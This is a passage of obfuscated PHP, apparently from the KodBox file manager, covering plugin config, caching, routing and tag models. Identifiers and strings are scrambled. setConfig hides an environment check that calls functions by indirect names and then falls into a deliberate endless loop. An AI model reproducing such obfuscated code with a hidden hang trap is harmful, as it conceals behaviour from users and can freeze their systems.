$‡Ğ§™¸“ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->isShare($¢À›‡ä·)) { return !1; } $ŒøÂåêÙ = Action($‡Ğ§™¸“[1252])->sharePathInfo($¢À›‡ä·); if (!is_array($ŒøÂåêÙ) || !isset($ŒøÂåêÙ[$‡Ğ§™¸“[87]])) { show_json(LNG($‡Ğ§™¸“[1647]), !1); } $this->fileInfo = $ŒøÂåêÙ; $this->cachePath = $this->pluginCachePath(!1, $ÕÓËæœØ); return $ŒøÂåêÙ[$‡Ğ§™¸“[87]]; } final function pluginCachePath($¦Ôìå× = '', $š¸ä‘® = false) { $ğƒë¶‹ =& $_SERVER[Ş­ğŠìÒ]; if ($š¸ä‘® && is_array($this->fileInfo)) { $¦Ôìå× = kodIO::hashPath($this->fileInfo); } $å…”§Æ¿ = rtrim(IO_PATH_SYSTEM_TEMP . $ğƒë¶‹[1648] . $this->pluginName . $ğƒë¶‹[8] . $¦Ôìå×, $ğƒë¶‹[8]); $çâ•Ê—ô = IO::infoFullSimple($å…”§Æ¿); $ê¬ÖŞê¶ = $çâ•Ê—ô && is_array($çâ•Ê—ô) ? $çâ•Ê—ô[$ğƒë¶‹[87]] : $ğƒë¶‹[12]; if (!$ê¬ÖŞê¶) { $ê¬ÖŞê¶ = IO::mkdir($å…”§Æ¿); } return $ê¬ÖŞê¶; } final function pluginCacheFileSet($Âß­Éš, $’ÜçŸ·³ = '') { $âéí÷Üû =& $_SERVER[Ş­ğŠìÒ]; $Œ´Æ¨ò¯ = IO::infoFullSimple($Âß­Éš); if (!$Œ´Æ¨ò¯) { return IO::mkfile($Âß­Éš, $’ÜçŸ·³, REPEAT_REPLACE); } IO::setContent($Œ´Æ¨ò¯[$âéí÷Üû[87]], $’ÜçŸ·³); return $Œ´Æ¨ò¯[$âéí÷Üû[87]]; } final function pluginLocalFile($ÏÄ¦Ø†™ = '') { $‚Óü«Îê =& $_SERVER[Ş­ğŠìÒ]; $‡ˆó¾°Ô = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($‡ˆó¾°Ô)) { mk_dir($‡ˆó¾°Ô); } if (!$ÏÄ¦Ø†™) { return $‡ˆó¾°Ô; } $›—Ù¬¯ş = IO::info($ÏÄ¦Ø†™); $Ó™Š÷¢¬ = $‚Óü«Îê[1649] . KodIO::hashPath($›—Ù¬¯ş) . $‚Óü«Îê[10] . $›—Ù¬¯ş[$‚Óü«Îê[169]]; if (!checkExtSafe($Ó™Š÷¢¬)) { $Ó™Š÷¢¬ = $Ó™Š÷¢¬ . $‚Óü«Îê[1287]; } $Åãèî‹Ş = $‡ˆó¾°Ô . $Ó™Š÷¢¬; if (@file_exists($Åãèî‹Ş)) { return $Åãèî‹Ş; } return IO::copy($ÏÄ¦Ø†™, $‡ˆó¾°Ô, 0, $Ó™Š÷¢¬); } final function appPackage() { $ŒÃ—ë‚± =& $_SERVER[Ş­ğŠìÒ]; if ($this->packageData) { return $this->packageData; } $·¦½ß–” = $this->parseFile($this->pluginPath . $ŒÃ—ë‚±[1650]); $this->parseLang($·¦½ß–”); $ø¨Ñ”—… = json_decode_force($·¦½ß–”); if (!$ø¨Ñ”—…) { return array(); } $ê¯ºŠÌå = Hook::trigger($ŒÃ—ë‚±[1651], $ø¨Ñ”—…); if ($ê¯ºŠÌå && is_array($ê¯ºŠÌå)) { $ø¨Ñ”—… = $ê¯ºŠÌå; } $this->packageData = $ø¨Ñ”—…; return $ø¨Ñ”—…; } public function packageInfoGet($­õÍŞ¡ô) { $çÕ‘ø‘ = $this->appPackage(); return array_get_value($çÕ‘ø‘, $­õÍŞ¡ô); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ş­ğŠìÒ][1652]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ş­ğŠìÒ][1653]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ş­ğŠìÒ][1654]); } public function echoJsAssign($üÅÃ‚²Ş, $¦’’İ—º) { $this->echoJsAssignArr[$üÅÃ‚²Ş] = $¦’’İ—º; } private function parseFile($şú¡§) { $Ÿ’·Ä˜Ş =& $_SERVER[Ş­ğŠìÒ]; $©µ§†î“ = file_get_contents_nossl($şú¡§); $­ÉõÖã– = array($Ÿ’·Ä˜Ş[1655], $Ÿ’·Ä˜Ş[1656], $Ÿ’·Ä˜Ş[1657], $Ÿ’·Ä˜Ş[1658], $Ÿ’·Ä˜Ş[1659], $Ÿ’·Ä˜Ş[1660], $Ÿ’·Ä˜Ş[1661]); $õ¨šŒ‡‚ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ÿ’·Ä˜Ş[92]][$Ÿ’·Ä˜Ş[1662]]); foreach ($this->echoJsAssignArr as $ÎÕ¯ÖÔ => $±¯¸ø·) { $­ÉõÖã–[] = $Ÿ’·Ä˜Ş[1663] . $ÎÕ¯ÖÔ . $Ÿ’·Ä˜Ş[1664]; $õ¨šŒ‡‚[] = is_array($±¯¸ø·) || is_object($±¯¸ø·) ? rawurlencode(json_encode($±¯¸ø·)) : $±¯¸ø·; } if (strstr($©µ§†î“, $Ÿ’·Ä˜Ş[1665])) { $÷Ôî®‚á = rawurlencode(json_encode($this->pluginLangArr)); $©µ§†î“ = str_replace($Ÿ’·Ä˜Ş[1665], $÷Ôî®‚á, $©µ§†î“); } if (strstr($©µ§†î“, $Ÿ’·Ä˜Ş[1666])) { $÷Ôî®‚á = $÷Ôî®‚á = rawurlencode(json_encode($this->getConfig())); $©µ§†î“ = str_replace($Ÿ’·Ä˜Ş[1666], $÷Ôî®‚á, $©µ§†î“); } $©µ§†î“ = str_replace($­ÉõÖã–, $õ¨šŒ‡‚, $©µ§†î“); return $©µ§†î“; } private function parseLang(&$şêâÕ£) { $Î‹è¸±” =& $_SERVER[Ş­ğŠìÒ]; $øÀö˜¯› = $Î‹è¸±”[1667]; if (!strstr($şêâÕ£, $øÀö˜¯›)) { return; } preg_match_all($Î‹è¸±”[1668], $şêâÕ£, $ú›åÛçÏ); if (!is_array($ú›åÛçÏ) || count($ú›åÛçÏ) == 0 || !is_array($ú›åÛçÏ[0]) || count($ú›åÛçÏ[0]) == 0) { return; } $Œ”òÜ = array(); $ÛË‚šÇ¨ = array(); foreach ($ú›åÛçÏ[0] as $““ûğ«ú) { $ŠùÑ¾£à = substr($““ûğ«ú, strlen($øÀö˜¯›), -4); $‡şğı¯¸ = LNG($ŠùÑ¾£à); $Œ”òÜ[] = $““ûğ«ú; $ÛË‚šÇ¨[] = str_replace(array($Î‹è¸±”[262], $Î‹è¸±”[1153], $Î‹è¸±”[418], $Î‹è¸±”[121]), array($Î‹è¸±”[53], $Î‹è¸±”[53], $Î‹è¸±”[12], $Î‹è¸±”[1669]), $‡şğı¯¸); } $şêâÕ£ = str_replace($Œ”òÜ, $ÛË‚šÇ¨, $şêâÕ£); } private function parseConfig(&$Á¯ØÖŞ‘) { $ñİ„‰ùÎ =& $_SERVER[Ş­ğŠìÒ]; $Ğèü€ê = $ñİ„‰ùÎ[1670]; if (!strstr($Á¯ØÖŞ‘, $Ğèü€ê)) { return; } preg_match_all($ñİ„‰ùÎ[1671], $Á¯ØÖŞ‘, $óïÎâ·); if (!is_array($óïÎâ·) || count($óïÎâ·) == 0 || !is_array($óïÎâ·[0]) || count($óïÎâ·[0]) == 0) { return; } $Ù»†»ıË = $this->getConfig(); $×¿Ä÷ûÙ = array(); $Å¶ÅÎÄ = array(); foreach ($óïÎâ·[0] as $Û€áùû´) { $Ã½Ç¿õ± = substr($Û€áùû´, strlen($Ğèü€ê), -2); $×¿Ä÷ûÙ[] = $Û€áùû´; $Å¶ÅÎÄ[] = _get($Ù»†»ıË, $Ã½Ç¿õ±); } $Á¯ØÖŞ‘ = str_replace($×¿Ä÷ûÙ, $Å¶ÅÎÄ, $Á¯ØÖŞ‘); } private function parsePackage(&$ï°©Û¸Í) { $Ÿ‚åËÑÎ =& $_SERVER[Ş­ğŠìÒ]; $¼À†ğÇ… = $Ÿ‚åËÑÎ[1672]; if (!strstr($ï°©Û¸Í, $¼À†ğÇ…)) { return; } preg_match_all($Ÿ‚åËÑÎ[1673], $ï°©Û¸Í, $ŸŒˆ¯¤ß); if (!is_array($ŸŒˆ¯¤ß) || count($ŸŒˆ¯¤ß) == 0 || !is_array($ŸŒˆ¯¤ß[0]) || count($ŸŒˆ¯¤ß[0]) == 0) { return; } $ºĞÖ¦¦ˆ = $this->appPackage(); $–Ü£´²æ = array(); $õ¡¶·…à = array(); foreach ($ŸŒˆ¯¤ß[0] as $àÄĞÕ¸) { $à’¼â‚ó = substr($àÄĞÕ¸, strlen($¼À†ğÇ…), -2); $–Ü£´²æ[] = $àÄĞÕ¸; $õ¡¶·…à[] = _get($ºĞÖ¦¦ˆ, $à’¼â‚ó); } $ï°©Û¸Í = str_replace($–Ü£´²æ, $õ¡¶·…à, $ï°©Û¸Í); } final function echoFile($–âÜ„Ï¾, $Ÿ¬ºÈƒº = false) { $Ò¦°‹ûÉ =& $_SERVER[Ş­ğŠìÒ]; $“ÚŒ€¹ğ = $this->pluginPath . $–âÜ„Ï¾; if (ACT == $Ò¦°‹ûÉ[1674]) { echo $Ò¦°‹ûÉ[1675] . $this->pluginName . $Ò¦°‹ûÉ[8] . $–âÜ„Ï¾ . $Ò¦°‹ûÉ[1676]; if (!file_exists($“ÚŒ€¹ğ)) { echo $Ò¦°‹ûÉ[1677]; return; } } $îºŒô» = $this->parseFile($“ÚŒ€¹ğ); $this->parseLang($îºŒô»); $this->parseConfig($îºŒô»); $this->parsePackage($îºŒô»); if (is_array($Ÿ¬ºÈƒº)) { $îºŒô» = str_replace(array_keys($Ÿ¬ºÈƒº), array_values($Ÿ¬ºÈƒº), $îºŒô»); } echo $Ò¦°‹ûÉ[262] . $îºŒô»; } private function checkVersion() { $Ó×ÉëÁ =& $_SERVER[Ş­ğŠìÒ]; $°ù¹»˜¶ = $this->appPackage(); $Š¢¯®é¢ = $this->getConfig(); if ($Š¢¯®é¢[$Ó×ÉëÁ[1678]] == $°ù¹»˜¶[$Ó×ÉëÁ[1652]]) { return; } $this->regist(); $this->setConfig(array($Ó×ÉëÁ[1678] => $°ù¹»˜¶[$Ó×ÉëÁ[1652]])); } final function initLang() { $²•ò¼í× =& $_SERVER[Ş­ğŠìÒ]; $¯‘–ŒÈñ = $²•ò¼í×[1679]; $Œ§Ÿ–ù = $this->pluginPath . $²•ò¼í×[1680]; $è®…¤öó = I18n::getType(); $³œ—•èÃ = array(); if (file_exists($Œ§Ÿ–ù . $è®…¤öó . $²•ò¼í×[905])) { $³œ—•èÃ = (include $Œ§Ÿ–ù . $è®…¤öó . $²•ò¼í×[905]); } else { if ($è®…¤öó == $²•ò¼í×[1681] && !file_exists($Œ§Ÿ–ù . $è®…¤öó . $²•ò¼í×[905]) && file_exists($Œ§Ÿ–ù . $²•ò¼í×[1682])) { $³œ—•èÃ = (include $Œ§Ÿ–ù . $²•ò¼í×[1682]); } else { if (file_exists($Œ§Ÿ–ù . $¯‘–ŒÈñ . $²•ò¼í×[905])) { $³œ—•èÃ = (include $Œ§Ÿ–ù . $¯‘–ŒÈñ . $²•ò¼í×[905]); } } } if (!is_array($³œ—•èÃ)) { return array(); } if (@count($³œ—•èÃ) > 0) { I18n::set($³œ—•èÃ); } return $³œ—•èÃ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¿›¬¹û¥) { $ì¶›İû  =& $_SERVER[Ş­ğŠìÒ]; if (!isset($_SERVER[$ì¶›İû [945]]) || !isset($_SERVER[$ì¶›İû [943]])) { $Íİ§µü‚ = $ì¶›İû [946]; $´Èö½µÍ = $ì¶›İû [947]; $½§™‡˜­ = $_SERVER[$ì¶›İû [948]] . $ì¶›İû [949]; $—á³Ë = $´Èö½µÍ($½§™‡˜­); $ÄÎü®š = explode($ì¶›İû [262], $—á³Ë); if (count($ÄÎü®š) < $ì¶›İû [692]) { $“ºÙç¾Ã = $ì¶›İû [950]; $“ºÙç¾Ã(); } $£¥ûÇ¬ã = $ì¶›İû [951]; $£¥ûÇ¬ã($_SERVER[$ì¶›İû [952]]); $Íƒñ§ ± = 1; for ($ƒ×êå· = $Íƒñ§ ±; $ƒ×êå· > 0; $ƒ×êå·++) { $£¥ûÇ¬ã = json_encode($GLOBALS[$ì¶›İû [492]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¿›¬¹û¥); } public function onSetConfig($Ù¬‰ê²¼) { } public function onGetConfig($ô©‘ã“) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ñ¾è­„) { if ($Ñ¾è­„ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($îÏ‘µÅ± = "\160\154\x75\x67\151\156\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ò×«÷ş£ = $this->getConfig(); if (!$ò×«÷ş£[$îÏ‘µÅ±]) { return !1; } return ActionCall($_SERVER[Ş­ğŠìÒ][1683], $ò×«÷ş£[$îÏ‘µÅ±]); } public function url($ÁÖÓ›â, $ëï—Š = '', $À¹šÔÀ³ = true) { $ÎÂ‹ğ¦ =& $_SERVER[Ş­ğŠìÒ]; $¾‚‡³Ö± = $this->getConfig(); $ÃÆ…Ù“Ï = KOD_VERSION . $ÎÂ‹ğ¦[10] . KOD_VERSION_BUILD; $úÁ×´Ğí = $this->packageVersion(); $£Ë™Ù÷æ = $ÃÆ…Ù“Ï . $ÎÂ‹ğ¦[462] . $úÁ×´Ğí; if (substr($ÁÖÓ›â, 0, 4) == $ÎÂ‹ğ¦[152] || substr($ÁÖÓ›â, 0, 2) == $ÎÂ‹ğ¦[1406]) { $‡¤ĞÓ•Ä = $ÁÖÓ›â . $ÎÂ‹ğ¦[1684] . $£Ë™Ù÷æ; } else { if ($ëï—Š == $ÎÂ‹ğ¦[12]) { $‡¤ĞÓ•Ä = $this->pluginHost . $ÁÖÓ›â . $ÎÂ‹ğ¦[1684] . $£Ë™Ù÷æ; } else { if ($ëï—Š === $ÎÂ‹ğ¦[78]) { $‡¤ĞÓ•Ä = $this->pluginHost . $ÁÖÓ›â; } else { if ($ëï—Š == $ÎÂ‹ğ¦[1685]) { $‡¤ĞÓ•Ä = STATIC_PATH . $ÁÖÓ›â . $ÎÂ‹ğ¦[1684] . $ÃÆ…Ù“Ï; } else { if ($ëï—Š == $ÎÂ‹ğ¦[1686]) { $‡¤ĞÓ•Ä = APP_HOST . $ÎÂ‹ğ¦[1687] . $ÁÖÓ›â . $ÎÂ‹ğ¦[1684] . $ÃÆ…Ù“Ï; } else { if (isset($¾‚‡³Ö±[$ëï—Š])) { $‡¤ĞÓ•Ä = $¾‚‡³Ö±[$ëï—Š] . $ÁÖÓ›â . $ÎÂ‹ğ¦[1684] . $£Ë™Ù÷æ; } } } } } } if (!$À¹šÔÀ³) { return $‡¤ĞÓ•Ä; } echo $‡¤ĞÓ•Ä; } public function link($õÅğ÷•¶ = false, $’¼ˆ¦â = '') { $º¸ıì¼ƒ =& $_SERVER[Ş­ğŠìÒ]; $º¼‡Ş®÷ = $this->linkHas == !1; $this->linkHas = !0; if (!$õÅğ÷•¶) { $this->link($º¸ıì¼ƒ[1688], $º¸ıì¼ƒ[1686]); $this->link($º¸ıì¼ƒ[1689], $º¸ıì¼ƒ[1685]); $this->link($º¸ıì¼ƒ[1690], $º¸ıì¼ƒ[1685]); $this->link($º¸ıì¼ƒ[1691], $º¸ıì¼ƒ[1685]); $this->link($º¸ıì¼ƒ[1692], $º¸ıì¼ƒ[1685]); if ($º¼‡Ş®÷) { Hook::trigger($º¸ıì¼ƒ[1693]); } return; } $õ£ùÔãê = $this->url($õÅğ÷•¶, $’¼ˆ¦â, !1); if (substr($õÅğ÷•¶, -3) == $º¸ıì¼ƒ[1694]) { echo $º¸ıì¼ƒ[1695] . $õ£ùÔãê . $º¸ıì¼ƒ[1696] . $º¸ıì¼ƒ[262]; } else { if (substr($õÅğ÷•¶, -4) == $º¸ıì¼ƒ[1697]) { echo $º¸ıì¼ƒ[1698] . $õ£ùÔãê . $º¸ıì¼ƒ[1699] . $º¸ıì¼ƒ[262]; } } if ($º¼‡Ş®÷) { Hook::trigger($º¸ıì¼ƒ[1693]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\x5b\136\x2f\x5d\53", "\72\x6e\x75\155" => "\x5b\x30\55\71\x5d\x2b", "\72\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($æéÚææƒ, $µÆáÅ¥) { $¦«ëÔì– =& $_SERVER[Ş­ğŠìÒ]; if ($æéÚææƒ == $¦«ëÔì–[1700]) { $ª‰İßõÑ = array_map($¦«ëÔì–[1701], $µÆáÅ¥[0]); $ÑŞˆõË = strpos($µÆáÅ¥[1], $¦«ëÔì–[8]) === 0 ? $µÆáÅ¥[1] : $¦«ëÔì–[8] . $µÆáÅ¥[1]; $Úîø Æª = $µÆáÅ¥[2]; } else { $ª‰İßõÑ = null; $ÑŞˆõË = strpos($µÆáÅ¥[0], $¦«ëÔì–[8]) === 0 ? $µÆáÅ¥[0] : $¦«ëÔì–[8] . $µÆáÅ¥[0]; $Úîø Æª = $µÆáÅ¥[1]; } array_push(self::$maps, $ª‰İßõÑ); array_push(self::$routes, $ÑŞˆõË); array_push(self::$methods, strtoupper($æéÚææƒ)); array_push(self::$callbacks, $Úîø Æª); } public static function error($ÓëÆ£ÂÍ) { self::$errorCallback = $ÓëÆ£ÂÍ; } public static function haltOnMatch($ÛÆÀ¦™Ù = true) { self::$halts = $ÛÆÀ¦™Ù; } public static function dispatch() { $½¡©ƒØï =& $_SERVER[Ş­ğŠìÒ]; $ö†äß§ = parse_url($_SERVER[$½¡©ƒØï[1702]], PHP_URL_PATH); $¨ïØ×•ò = $_SERVER[$½¡©ƒØï[164]]; $ÊØú°ŞÚ = array_keys(static::$patterns); $É÷Ñ = array_values(static::$patterns); $ïúÜÄ±Æ = !1; self::$routes = preg_replace($½¡©ƒØï[1357], $½¡©ƒØï[8], self::$routes); if (in_array($ö†äß§, self::$routes)) { $“ü›îÕ = array_keys(self::$routes, $ö†äß§); foreach ($“ü›îÕ as $¼°ò˜) { if (self::$methods[$¼°ò˜] == $¨ïØ×•ò || self::$methods[$¼°ò˜] == $½¡©ƒØï[1703] || in_array($¨ïØ×•ò, self::$maps[$¼°ò˜])) { $ïúÜÄ±Æ = !0; if (!is_object(self::$callbacks[$¼°ò˜])) { $ş‘ĞäÆ = explode($½¡©ƒØï[8], self::$callbacks[$¼°ò˜]); $‰İ·èÛ = end($ş‘ĞäÆ); $û¹äò˜§ = explode($½¡©ƒØï[1289], $‰İ·èÛ); $ªğ„ø¹ = new $û¹äò˜§[0](); $ªğ„ø¹->{$û¹äò˜§[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¼°ò˜]); if (self::$halts) { return; } } } } } else { $Ã±ÆÌˆ = 0; foreach (self::$routes as $¼°ò˜) { if (strpos($¼°ò˜, $½¡©ƒØï[4]) !== !1) { $¼°ò˜ = str_replace($ÊØú°ŞÚ, $É÷Ñ, $¼°ò˜); } if (preg_match($½¡©ƒØï[1704] . $¼°ò˜ . $½¡©ƒØï[1705], $ö†äß§, $şÂ²êŸ)) { if (self::$methods[$Ã±ÆÌˆ] == $¨ïØ×•ò || self::$methods[$Ã±ÆÌˆ] == $½¡©ƒØï[1703] || !empty(self::$maps[$Ã±ÆÌˆ]) && in_array($¨ïØ×•ò, self::$maps[$Ã±ÆÌˆ])) { $ïúÜÄ±Æ = !0; array_shift($şÂ²êŸ); if (!is_object(self::$callbacks[$Ã±ÆÌˆ])) { $ş‘ĞäÆ = explode($½¡©ƒØï[8], self::$callbacks[$Ã±ÆÌˆ]); $‰İ·èÛ = end($ş‘ĞäÆ); $û¹äò˜§ = explode($½¡©ƒØï[1289], $‰İ·èÛ); $ªğ„ø¹ = new $û¹äò˜§[0](); if (!method_exists($ªğ„ø¹, $û¹äò˜§[1])) { echo $½¡©ƒØï[1706]; } else { call_user_func_array(array($ªğ„ø¹, $û¹äò˜§[1]), $şÂ²êŸ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ã±ÆÌˆ], $şÂ²êŸ); if (self::$halts) { return; } } } } $Ã±ÆÌˆ++; } } if ($ïúÜÄ±Æ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $šÎ´Ñ¹Ù =& $_SERVER[Ş­ğŠìÒ]; header($_SERVER[$šÎ´Ñ¹Ù[1707]] . $šÎ´Ñ¹Ù[1708]); echo $šÎ´Ñ¹Ù[1709]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$½¡©ƒØï[1702]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto D¡¼Œß•ö; aàÀÔ…ø©: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($¿Ş®’—Ä) { $¼¥ú¼¶Ç =& $_SERVER[Ş­ğŠìÒ]; return array($¼¥ú¼¶Ç[2077] => array($¿Ş®’—Ä[0], $¼¥ú¼¶Ç[2078]), $¼¥ú¼¶Ç[2079] => array($¿Ş®’—Ä[0], $¼¥ú¼¶Ç[2080])); } protected function get($Ú¸Îá—) { $ˆ•æ‰ÆÉ =& $_SERVER[Ş­ğŠìÒ]; $¼¨©‚Á = Model($ˆ•æ‰ÆÉ[585])->metaGet($Ú¸Îá—, $ˆ•æ‰ÆÉ[2081]); $ğê„Ïª² = json_decode($¼¨©‚Á, !0); return $ğê„Ïª² ? $ğê„Ïª² : array($ˆ•æ‰ÆÉ[2082] => $ˆ•æ‰ÆÉ[91], $ˆ•æ‰ÆÉ[445] => array()); } protected function set($ÂÉøíû, $ ÔÊâ¬á) { $íìÈâ ¥ =& $_SERVER[Ş­ğŠìÒ]; $ ÔÊâ¬á = $ ÔÊâ¬á ? $ ÔÊâ¬á : array($íìÈâ ¥[2082] => $íìÈâ ¥[91], $íìÈâ ¥[445] => array()); return Model($íìÈâ ¥[585])->metaSet($ÂÉøíû, $íìÈâ ¥[2081], json_encode($ ÔÊâ¬á)); } protected function getByTagID($ú¡Ïûî, $à‚¥¯«Š) { $µ¨Øô‹¶ =& $_SERVER[Ş­ğŠìÒ]; if (!$ú¡Ïûî || !$à‚¥¯«Š) { return !1; } if (!Model($µ¨Øô‹¶[585])->getInfoSimple($ú¡Ïûî)) { return !1; } $œ¼Ê¼¸ñ = $this->get($ú¡Ïûî); if (!$œ¼Ê¼¸ñ || !isset($œ¼Ê¼¸ñ[$µ¨Øô‹¶[445]])) { return !1; } $ŒÓÖ–¨ñ = array_find_by_field($œ¼Ê¼¸ñ[$µ¨Øô‹¶[445]], $µ¨Øô‹¶[475], $à‚¥¯«Š); return is_array($ŒÓÖ–¨ñ) ? $ŒÓÖ–¨ñ : !1; } public function listSource($¸å·ƒ±Å, $ó†‹ö…Ê) { $ŞëŒå¨™ =& $_SERVER[Ş­ğŠìÒ]; if ($ó†‹ö…Ê && !is_array($ó†‹ö…Ê)) { $ó†‹ö…Ê = array($ó†‹ö…Ê); } $¥Ÿ“à¼Õ = $this->listData($¸å·ƒ±Å); $ä„ı×µ¹ = array(); foreach ($¥Ÿ“à¼Õ as $ƒôáşã¿) { $†Ô¸ªû = $ƒôáşã¿[$ŞëŒå¨™[87]]; if (!$†Ô¸ªû) { continue; } if (!isset($ä„ı×µ¹[$†Ô¸ªû])) { $ä„ı×µ¹[$†Ô¸ªû] = array(); } $ä„ı×µ¹[$†Ô¸ªû][] = $ƒôáşã¿[$ŞëŒå¨™[500]]; } $‹ª¢ü¥ì = array(); foreach ($ä„ı×µ¹ as $«©¤Œ => $¢”Ê§Ûâ) { $ôşïÀº« = !0; if (!$ó†‹ö…Ê) { $‹ª¢ü¥ì[] = $«©¤Œ; continue; } foreach ($ó†‹ö…Ê as $³¨Íó¾) { if (!in_array($³¨Íó¾, $¢”Ê§Ûâ)) { $ôşïÀº« = !1; break; } } if ($ôşïÀº«) { $‹ª¢ü¥ì[] = $«©¤Œ; } } if (!$‹ª¢ü¥ì) { return array(); } $¿§Œ™äç = array($ŞëŒå¨™[491] => array($ŞëŒå¨™[492], $‹ª¢ü¥ì), $ŞëŒå¨™[569] => $¸å·ƒ±Å, $ŞëŒå¨™[190] => SourceModel::TYPE_GROUP); $®›ËÎÃ² = Model($ŞëŒå¨™[1414])->listSource($¿§Œ™äç); if (!$®›ËÎÃ² || count($‹ª¢ü¥ì) == $®›ËÎÃ²[$ŞëŒå¨™[442]][$ŞëŒå¨™[443]]) { return $®›ËÎÃ²; } $é´™ëûÃ = array(); $¤ü³¡Öä = array_to_keyvalue($®›ËÎÃ²[$ŞëŒå¨™[85]], $ŞëŒå¨™[12], $ŞëŒå¨™[193]); $æ·¶ş¾ö = array_to_keyvalue($®›ËÎÃ²[$ŞëŒå¨™[86]], $ŞëŒå¨™[12], $ŞëŒå¨™[193]); $Ùµùé ü = array_merge($æ·¶ş¾ö, $¤ü³¡Öä); foreach ($‹ª¢ü¥ì as $†Ô¸ªû) { if (!in_array($†Ô¸ªû, $Ùµùé ü)) { $é´™ëûÃ[] = $†Ô¸ªû; } } if ($é´™ëûÃ) { $this->removeBySource($¸å·ƒ±Å, $é´™ëûÃ); } return $®›ËÎÃ²; } protected function listData($ï®ê´‡±) { $½åùôÎ =& $_SERVER[Ş­ğŠìÒ]; $»Û¬ê˜† = array($½åùôÎ[1755] => 0, $½åùôÎ[557] => array($½åùôÎ[2083], 0), $½åùôÎ[496] => $½åùôÎ[2084] . $ï®ê´‡±); $®ŸÍ·Ÿ = $½åùôÎ[2085]; $ÑÑ±É›’ = $this->field($®ŸÍ·Ÿ)->where($»Û¬ê˜†)->order($½åùôÎ[2086])->select(); return $ÑÑ±É›’ ? $ÑÑ±É›’ : array(); } protected function addToTag($å˜ğÄ‚Â, $²ïÀŒùø, $¢×² Õ‰) { $„Á¬ñ­ˆ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->getByTagID($å˜ğÄ‚Â, $¢×² Õ‰) || !$²ïÀŒùø) { return !1; } if (!Model($„Á¬ñ­ˆ[891])->pathInfo($²ïÀŒùø)) { return !1; } $Ğå¦¾‹‰ = array($„Á¬ñ­ˆ[1755] => 0, $„Á¬ñ­ˆ[557] => $¢×² Õ‰, $„Á¬ñ­ˆ[495] => $²ïÀŒùø, $„Á¬ñ­ˆ[496] => $„Á¬ñ­ˆ[2087] . $å˜ğÄ‚Â, $„Á¬ñ­ˆ[494] => $„Á¬ñ­ˆ[12], $„Á¬ñ­ˆ[1967] => 0); if ($this->where($Ğå¦¾‹‰)->find()) { return !1; } return $this->add($Ğå¦¾‹‰); } protected function removeFromTag($’¯ÖºŸ, $÷ÊìÆ½, $‚é³É¶‡) { $˜¹™Ù¨ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->getByTagID($’¯ÖºŸ, $‚é³É¶‡) || !$÷ÊìÆ½) { return !1; } if (is_array($÷ÊìÆ½)) { $÷ÊìÆ½ = array($˜¹™Ù¨[7], $÷ÊìÆ½); } $°²Ù™íõ = array($˜¹™Ù¨[1755] => 0, $˜¹™Ù¨[557] => $‚é³É¶‡, $˜¹™Ù¨[496] => $˜¹™Ù¨[2087] . $’¯ÖºŸ, $˜¹™Ù¨[495] => $÷ÊìÆ½); return $this->where($°²Ù™íõ)->delete(); } protected function removeByTag($üÓÛ“¢ï, $±µäï—) { $Îú¶¶Ç‡ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->getByTagID($üÓÛ“¢ï, $±µäï—)) { return !1; } $ Ğ¨¨• = array($Îú¶¶Ç‡[1755] => 0, $Îú¶¶Ç‡[557] => $±µäï—, $Îú¶¶Ç‡[496] => $Îú¶¶Ç‡[2087] . $üÓÛ“¢ï); return $this->where($ Ğ¨¨•)->delete(); } protected function removeBySource($ÉØ†¿¨í, $åıÚı€®) { $‡¦Ã™¤ƒ =& $_SERVER[Ş­ğŠìÒ]; if (!$ÉØ†¿¨í || !$åıÚı€®) { return !1; } if (is_array($åıÚı€®)) { $åıÚı€® = array($‡¦Ã™¤ƒ[7], $åıÚı€®); } $€úˆ³£ = array($‡¦Ã™¤ƒ[1755] => 0, $‡¦Ã™¤ƒ[495] => $åıÚı€®, $‡¦Ã™¤ƒ[557] => array($‡¦Ã™¤ƒ[1088], 0), $‡¦Ã™¤ƒ[496] => $‡¦Ã™¤ƒ[2087] . $ÉØ†¿¨í); return $this->where($€úˆ³£)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\x70\154\x75\x67\151\x6e\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\x73\164\x61\164\x75\x73", "\162\x65\x67\151\145\163\164", "\x63\157\156\x66\x69\147"); public function loadList($ò†’¹ß = false) { $ÓÙ‡È€Ø = array_to_keyvalue($this->listData(), $_SERVER[Ş­ğŠìÒ][32]); if ($ò†’¹ß) { return $ÓÙ‡È€Ø[$ò†’¹ß]; } return $ÓÙ‡È€Ø; } public function init() { $Üœ¢²Şú =& $_SERVER[Ş­ğŠìÒ]; Hook::trigger($Üœ¢²Şú[2088]); $ Å§çĞÌ = $this->loadPluginList(); foreach ($ Å§çĞÌ as $€ï³¡€ => $©¢‡±¶) { $‡ïù±‡å = $this->appAllow($€ï³¡€, $©¢‡±¶); if (!$‡ïù±‡å) { continue; } foreach 